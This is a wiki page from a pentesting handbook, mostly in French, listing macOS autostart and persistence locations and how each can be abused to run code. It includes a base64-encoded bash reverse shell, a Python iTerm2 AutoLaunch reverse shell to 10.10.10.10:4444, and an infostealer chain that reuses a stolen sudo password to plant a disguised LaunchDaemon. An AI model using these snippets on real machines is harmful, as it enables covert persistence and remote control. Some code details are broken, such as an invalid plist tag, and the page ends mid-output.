# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.

## Sandbox Bypass

> [!TIP]
> Ici vous trouverez des emplacements de démarrage utiles pour le **sandbox bypass** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** puis en **attendant** une action très **commune**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'un sandbox sans nécessiter les **privilèges root**.

### Launchd

- Utile pour le sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Redémarrage
- Requiert des privilèges root
- **`/Library/LaunchDaemons`**
- **Trigger**: Redémarrage
- Requiert des privilèges root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Redémarrage
- Requiert des privilèges root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Redémarrage
- Requiert des privilèges root
- **`~/Library/LaunchAgents`**
- **Trigger**: Réouverture de session
- **`~/Library/LaunchDemons`**
- **Trigger**: Réouverture de session

> [!TIP]
> Fait intéressant, **`launchd`** possède une property list embarquée dans la section Mach-o `__Text.__config` qui contient d'autres services bien connus que launchd doit démarrer. De plus, ces services peuvent contenir `RequireSuccess`, `RequireRun` et `RebootOnSuccess` ce qui signifie qu'ils doivent être exécutés et se terminer avec succès.
>
> Bien sûr, cela ne peut pas être modifié à cause de la signature du code.

#### Description & Exploitation

**`launchd`** est le **premier** **processus** exécuté par le noyau d'OS X au démarrage et le dernier à se terminer à l'arrêt. Il doit toujours avoir le **PID 1**. Ce processus va **lire et exécuter** les configurations indiquées dans les plists **ASEP** dans :

- `/Library/LaunchAgents`: Per-user agents installés par l'admin
- `/Library/LaunchDaemons`: System-wide daemons installés par l'admin
- `/System/Library/LaunchAgents`: Per-user agents fournis par Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons fournis par Apple.

Lorsque un utilisateur ouvre une session, les plists situés dans `/Users/$USER/Library/LaunchAgents` et `/Users/$USER/Library/LaunchDemons` sont lancés avec les **permissions de l'utilisateur connecté**.

La **principale différence entre agents et daemons est que les agents sont chargés lors de l'ouverture de session de l'utilisateur et que les daemons sont chargés au démarrage du système** (puisqu'il existe des services comme ssh qui doivent être exécutés avant que tout utilisateur n'accède au système). De plus, les agents peuvent utiliser une GUI tandis que les daemons doivent s'exécuter en arrière-plan.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Il existe des cas où un **agent doit être exécuté avant que l'utilisateur ne se connecte**, ceux-ci sont appelés **PreLoginAgents**. Par exemple, cela est utile pour fournir des technologies d'assistance au moment de la connexion. Ils peuvent aussi se trouver dans `/Library/LaunchAgents` (voir [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) pour un exemple).

> [!TIP]
> Les nouveaux fichiers de configuration de Daemons ou d'Agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>` Il est **aussi possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant ces fichiers plist ne seront pas chargés automatiquement après un redémarrage).\
> Il est également possible de **décharger** avec `launchctl unload <target.plist>` (le processus pointé par celui-ci sera terminé),
>
> Pour **s'assurer** qu'il n'y a **rien** (comme un override) **empêchant** un **Agent** ou un **Daemon** **de** **s'exécuter**, lancez : `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lister tous les agents et daemons chargés par l'utilisateur courant :
```bash
launchctl list
```
#### Exemple de chaîne malveillante LaunchDaemon (réutilisation de mot de passe)

Un infostealer macOS récent a réutilisé un **mot de passe sudo capturé** pour déposer un user agent et un LaunchDaemon root :

- Écrire la boucle de l'agent dans `~/.agent` et la rendre exécutable.
- Générer un plist dans `/tmp/starter` pointant vers cet agent.
- Réutiliser le mot de passe volé avec `sudo -S` pour le copier dans `/Library/LaunchDaemons/com.finder.helper.plist`, définir `root:wheel`, et le charger avec `launchctl load`.
- Démarrer l'agent silencieusement via `nohup ~/.agent >/dev/null 2>&1 &` pour détacher la sortie.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Si un plist appartient à un utilisateur, même s'il se trouve dans des dossiers daemon à l'échelle du système, **la tâche sera exécutée en tant qu'utilisateur** et non en tant que root. Cela peut empêcher certaines attaques d'escalade de privilèges.

#### More info about launchd

**`launchd`** est le **premier** processus en mode utilisateur qui est démarré depuis le **kernel**. Le démarrage du processus doit être **réussi** et il **ne peut pas se terminer ni planter**. Il est même **protégé** contre certains **signaux de kill**.

L'une des premières choses que `launchd` fait est de **démarrer** tous les **daemons** tels que :

- **Timer daemons** basés sur un moment d'exécution :
- atd (`com.apple.atrun.plist`) : A un `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`) : A un `StartCalendarInterval` pour démarrer à 00:15
- **Network daemons** comme :
- `org.cups.cups-lpd` : Écoute en TCP (`SockType: stream`) avec `SockServiceName: printer`
- SockServiceName doit être soit un port soit un service provenant de `/etc/services`
- `com.apple.xscertd.plist` : Écoute sur TCP au port 1640
- **Path daemons** qui sont exécutés lorsqu'un chemin spécifié change :
- `com.apple.postfix.master` : Vérifie le chemin `/etc/postfix/aliases`
- **IOKit notifications daemons** :
- `com.apple.xartstorageremoted` : `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port :**
- `com.apple.xscertd-helper.plist` : Indique dans l'entrée `MachServices` le nom `com.apple.xscertd.helper`
- **UserEventAgent :**
- Ceci est différent du précédent. Il fait en sorte que launchd lance des apps en réponse à un événement spécifique. Cependant, dans ce cas, le binaire principal impliqué n'est pas `launchd` mais `/usr/libexec/UserEventAgent`. Il charge des plugins depuis le dossier restreint par SIP /System/Library/UserEventPlugins/ où chaque plugin indique son initialiseur dans la clé `XPCEventModuleInitializer` ou, dans le cas des anciens plugins, dans le dictionnaire `CFPluginFactories` sous la clé `FB86416D-6164-2070-726F-70735C216EC0` de son `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass : [✅](https://emojipedia.org/check-mark-button)
- Mais il faut trouver une application avec un TCC Bypass qui exécute un shell chargeant ces fichiers

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger** : Open a terminal with zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger** : Open a terminal with zsh
- Root required
- **`~/.zlogout`**
- **Trigger** : Exit a terminal with zsh
- **`/etc/zlogout`**
- **Trigger** : Exit a terminal with zsh
- Root required
- Potentiellement plus dans : **`man zsh`**
- **`~/.bashrc`**
- **Trigger** : Open a terminal with bash
- `/etc/profile` (didn't work)
- `~/.profile` (didn't work)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger** : Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`

#### Description & Exploitation

Lors de l'initialisation d'un environnement shell comme `zsh` ou `bash`, **certains fichiers de démarrage sont exécutés**. macOS utilise actuellement `/bin/zsh` comme shell par défaut. Ce shell est automatiquement utilisé lorsque l'application Terminal est lancée ou lorsqu'un appareil est accédé via SSH. Alors que `bash` et `sh` sont aussi présents sur macOS, ils doivent être invoqués explicitement pour être utilisés.

La page de manuel de zsh, que l'on peut lire avec **`man zsh`**, contient une longue description des fichiers de démarrage.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications rouvertes

> [!CAUTION]
> La configuration indiquée et le fait de se déconnecter/se reconnecter ou même de redémarrer n'ont pas permis d'exécuter l'application chez moi. (L'application ne s'exécutait pas ; peut-être doit-elle être en cours d'exécution au moment où ces actions sont effectuées)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Utile pour bypasser le sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Déclencheur**: Restart reopening applications

#### Description & Exploitation

Toutes les applications à rouvrir se trouvent dans le plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Donc, pour faire en sorte que les applications rouvertes lancent la vôtre, il suffit d'**ajouter votre app à la liste**.

L'UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier les applications qui seront rouvertes, vous pouvez faire :
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Pour **ajouter une application à cette liste** vous pouvez utiliser :
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Préférences Terminal

- Utile pour bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal a souvent les permissions FDA de l'utilisateur qui l'utilise

#### Emplacement

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Déclencheur**: Ouvrir Terminal

#### Description et exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l'utilisateur pour les Applications. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.

Par exemple, le Terminal peut exécuter une commande au démarrage :

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration se reflète dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** comme ceci:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Donc, si le plist des préférences du terminal du système pouvait être écrasé, la fonctionnalité **`open`** peut être utilisée pour **ouvrir le terminal et exécuter cette commande**.

Vous pouvez ajouter ceci depuis le cli avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Autres extensions de fichier

- Utile pour bypasser le sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal peut avoir les permissions FDA de l'utilisateur — utilisez-le

#### Emplacement

- **N'importe où**
- **Déclencheur** : Ouvrir Terminal

#### Description & Exploitation

Si vous créez un [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) et qu'il est ouvert, l'**application Terminal** sera automatiquement lancée pour exécuter les commandes qui y sont indiquées. Si l'app Terminal possède des privilèges spéciaux (par exemple TCC), vos commandes s'exécuteront avec ces privilèges.

Testez-le avec:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Vous pouvez aussi utiliser les extensions **`.command`**, **`.tool`**, avec du contenu de scripts shell classiques et elles seront également ouvertes par Terminal.

> [!CAUTION]
> Si Terminal a **Full Disk Access** il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre Terminal).

### Plugins Audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

- **`/Library/Audio/Plug-Ins/HAL`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`/Library/Audio/Plug-ins/Components`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`~/Library/Audio/Plug-ins/Components`**
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
- **`/System/Library/Components`**
- Accès root requis
- **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur

#### Description

D'après les writeups précédents, il est possible de **compiler certains plugins audio** et de les faire charger.

### Plugins QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & exploitation

Les plugins QuickLook peuvent être exécutés lorsque vous **déclenchez l'aperçu d'un fichier** (appuyez sur la barre d'espace avec le fichier sélectionné dans Finder) et qu'un **plugin supportant ce type de fichier** est installé.

Il est possible de compiler votre propre plugin QuickLook, de le placer dans un des emplacements précédents pour le charger, puis d'aller sur un fichier supporté et d'appuyer sur la barre d'espace pour le déclencher.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Cela n'a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez pouvoir exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont dépréciés mais peuvent être utilisés pour exécuter des commandes lorsqu'un utilisateur se connecte.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ce paramètre est stocké dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Pour le supprimer :
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Celui de l'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditionnel Sandbox Bypass

> [!TIP]
> Ici vous pouvez trouver des emplacements de démarrage utiles pour **sandbox bypass** qui vous permettent d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et en **s'attendant à des conditions pas très courantes** comme des **programmes spécifiques installés, actions « peu communes » d'un utilisateur** ou des environnements.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Utile pour bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Cependant, vous devez pouvoir exécuter le binaire `crontab`
- Ou être root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root requis pour un accès en écriture direct. Aucun root requis si vous pouvez exécuter `crontab <file>`
- **Déclencheur**: Depends on the cron job

#### Description & Exploitation

Listez les cron jobs de l'**utilisateur actuel** avec:
```bash
crontab -l
```
Vous pouvez également voir tous les cron jobs des utilisateurs dans **`/usr/lib/cron/tabs/`** et **`/var/at/tabs/`** (nécessite root).

Sur MacOS, plusieurs dossiers exécutant des scripts à une **certaine fréquence** peuvent être trouvés dans :
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Vous y trouverez les **cron** **jobs** réguliers, les **at** **jobs** (peu utilisés) et les **periodic** **jobs** (principalement utilisés pour nettoyer les fichiers temporaires). Les periodic jobs quotidiens peuvent être exécutés par exemple avec : `periodic daily`.

Pour ajouter un **cronjob utilisateur de manière programmatique** il est possible d'utiliser :
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Utile pour bypasser sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 avait auparavant des permissions TCC accordées

#### Emplacements

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Déclencheur** : Ouverture d'iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Déclencheur** : Ouverture d'iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Déclencheur** : Ouverture d'iTerm

#### Description et exploitation

Les scripts stockés dans **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** seront exécutés. Par exemple:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou :
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Le script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sera également exécuté :
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Les préférences d'iTerm2 situées dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.

Ce paramètre peut être configuré dans les réglages d'iTerm2 :

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande est reflétée dans les préférences :
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Vous pouvez définir la commande à exécuter avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Il est très probable qu'il existe **d'autres façons d'abuser iTerm2 preferences** pour exécuter des commandes arbitraires.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Utile pour bypasser le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais xbar doit être installé
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Il demande les autorisations d'accessibilité

#### Emplacement

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Déclencheur**: une fois xbar exécuté

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar est démarré :
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais Hammerspoon doit être installé
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Il demande les permissions Accessibility

#### Emplacement

- **`~/.hammerspoon/init.lua`**
- **Déclencheur**: Une fois hammerspoon exécuté

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sert de plateforme d'automatisation pour **macOS**, exploitant le langage de script **LUA** pour ses opérations. Notamment, il prend en charge l'intégration de code AppleScript complet et l'exécution de scripts shell, améliorant significativement ses capacités de scripting.

L'application recherche un seul fichier, `~/.hammerspoon/init.lua`, et au démarrage le script sera exécuté.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais BetterTouchTool doit être installé
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Il demande les permissions Automation-Shortcuts et Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Cet outil permet d'indiquer des applications ou scripts à exécuter lorsque certains raccourcis sont pressés. Un attaquant pourrait être en mesure de configurer son propre **raccourci et action à exécuter dans la base de données** pour faire exécuter du code arbitraire (un raccourci pourrait simplement être d'appuyer sur une touche).

### Alfred

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais Alfred doit être installé
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Il demande les permissions Automation, Accessibility et même Full-Disk access

#### Location

- `???`

Il permet de créer des workflows pouvant exécuter du code lorsque certaines conditions sont remplies. Potentiellement, un attaquant pourrait créer un fichier de workflow et forcer Alfred à le charger (il faut payer la version premium pour utiliser les workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais ssh doit être activé et utilisé
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH use to have FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root required
- **Trigger**: Login via ssh

> [!CAUTION]
> Pour activer ssh, il faut Full Disk Access :
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Par défaut, sauf si `PermitUserRC no` dans `/etc/ssh/sshd_config`, lorsqu'un utilisateur **se connecte par SSH** les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** seront exécutés.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez exécuter `osascript` avec des arguments
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger :** Connexion
- Exploit payload stocké en appelant **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger :** Connexion
- Requiert root

#### Description

Dans System Preferences -> Users & Groups -> **Login Items** vous pouvez trouver **des éléments à exécuter lorsque l'utilisateur se connecte**.\
Il est possible de les lister, ajouter et supprimer depuis la ligne de commande:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ces éléments sont stockés dans le fichier **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** peuvent **également** être indiqués en utilisant l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) qui stockera la configuration dans **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP en tant que Login Item

(Voir la section précédente sur Login Items, ceci est une extension)

Si vous stockez un fichier **ZIP** comme **Login Item**, **`Archive Utility`** l'ouvrira et, si le zip était par exemple stocké dans **`~/Library`** et contenait le dossier **`LaunchAgents/file.plist`** avec un backdoor, ce dossier sera créé (il ne l'est pas par défaut) et le plist sera ajouté ; ainsi, la prochaine fois que l'utilisateur se connectera, le **backdoor indiqué dans le plist sera exécuté**.

Une autre option serait de créer les fichiers **`.bash_profile`** et **`.zshenv`** dans le HOME de l'utilisateur ; ainsi, si le dossier LaunchAgents existe déjà, cette technique fonctionnera toujours.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez **exécuter** **`at`** et il doit être **activé**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Besoin d'**exécuter** **`at`** et il doit être **activé**

#### **Description**

`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.

Par **défaut** elles sont **désactivées** mais l'utilisateur **root** peut **les activer** avec:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Cela créera un fichier dans 1 heure :
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Vérifiez la file d'attente des tâches en utilisant `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Ci‑dessus, on voit deux tâches planifiées. On peut afficher les détails d'une tâche en utilisant `at -c JOBNUMBER`.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
